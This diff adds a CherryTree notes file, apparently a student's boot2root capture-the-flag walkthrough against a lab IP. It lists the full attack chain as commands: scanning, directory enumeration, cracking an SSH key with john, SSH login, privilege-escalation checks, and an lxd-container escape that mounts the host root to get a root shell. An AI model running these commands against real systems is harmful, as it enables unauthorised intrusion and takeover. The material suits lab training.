@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="Boot2root" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692589933" ts_lastsave="1692593947">
+    <rich_text weight="heavy">Enumeration</rich_text>
+    <rich_text>
+		</rich_text>
+    <rich_text underline="single">nmap scan</rich_text>
+    <rich_text>
+				nmap -sC -sV -n -Pn -vv 10.10.44.103
+				
+		</rich_text>
+    <rich_text underline="single">directory enumeration</rich_text>
+    <rich_text>
+				gobuster dir -u </rich_text>
+    <rich_text link="webs http://10.10.44.103">http://10.10.44.103</rich_text>
+    <rich_text> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -z
+				wget </rich_text>
+    <rich_text link="webs http://10.10.44.103/secret/secretkey">http://10.10.44.103/secret/secretkey</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text weight="heavy">Exploitation</rich_text>
+    <rich_text>
+		</rich_text>
+    <rich_text underline="single">cracking id_rsa</rich_text>
+    <rich_text>
+				ssh2john id_rsa &gt; hash
+				john --wordlist=/usr/share/wordlist/rockyou,txt hash
+				
+		</rich_text>
+    <rich_text underline="single">gaining session</rich_text>
+    <rich_text>
+				ssh -i secretKey john@10.10.44.103
+
+</rich_text>
+    <rich_text weight="heavy">Post Exploitation</rich_text>
+    <rich_text>
+		</rich_text>
+    <rich_text underline="single">sudo permissions</rich_text>
+    <rich_text>
+					sudo -l
+					sudo -ll
+			
+		</rich_text>
+    <rich_text underline="single">passwd file permissions</rich_text>
+    <rich_text>
+					ls -l /etc/passwd			
+					
+		</rich_text>
+    <rich_text underline="single">cron file check</rich_text>
+    <rich_text>
+					cat /etc/crontab
+					
+		</rich_text>
+    <rich_text underline="single">file with suid bit set</rich_text>
+    <rich_text>
+					find / -type f -perm -4000 2&gt;/dev/null
+					
+		</rich_text>
+    <rich_text underline="single">check for exploitable groups</rich_text>
+    <rich_text>
+					id			-			lxd group, if you are a member of this group you can become root
+					
+		</rich_text>
+    <rich_text underline="single">privilege escalation</rich_text>
+    <rich_text>
+					git clone  </rich_text>
+    <rich_text link="webs https://github.com/saghul/lxd-alpine-builder.git">https://github.com/saghul/lxd-alpine-builder.git</rich_text>
+    <rich_text>
+					lxc image list
+					lxc image import ./alpine-v3.12-x86_64-20200902_1515.tar.gz --alias myimage
+					lxc init myimage ignite -c security.privileged=true
+					lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+					lxc start ignite
+					lxc exec ignite /bin/sh
+					
+					lxc image delete $(lxc image list -c f --format csv)		- 		to delete all the images
+		
+		</rich_text>
+    <rich_text underline="single">finding flags</rich_text>
+    <rich_text>
+				find / -type f -name root.txt 2&gt;/dev/null
+			
+			
+					
+			</rich_text>
+  </node>
+</cherrytree>
